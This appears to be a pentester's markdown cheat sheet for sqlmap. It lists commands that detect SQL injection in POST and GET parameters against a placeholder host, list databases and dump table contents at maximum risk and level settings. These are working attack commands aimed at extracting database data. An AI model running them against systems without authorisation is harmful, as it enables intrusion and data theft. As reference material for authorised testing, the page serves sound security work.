---
title: Sqlmap
desc: SQL injection automation tool.
tags: [ActiveRecon, Linux, SQLi]
alts: [Nmap, SQLInjectionCheatSheet]
website:
---

## POST request

```sh
# --dbs: List all available databases
# --dump: Dump entries of database table
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbs --dump

# --all: Retrieve all
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --all

# --dbms: Set database system
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbms=mysql

# --risk=3 (max)
# --level=5 (max)
sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --risk=3 --level=5 --dump

# --headers: custom HTTP header
sqlmap --headers="Cookie: value=1234" -u "http://10.0.0.1" --data="username=test&password=test" --dbs --dump
```

<br />

## POST request (specify the request file)

```sh
# request.txt
POST /login HTTP/1.1
Host: 10.0.0.1

{"username":"*", "password": "*"}

# --------------------------------------------------------

sqlmap -r request.txt --risk=3 --level=5 --dump
```

<br />

## GET request

```sh
sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item 
```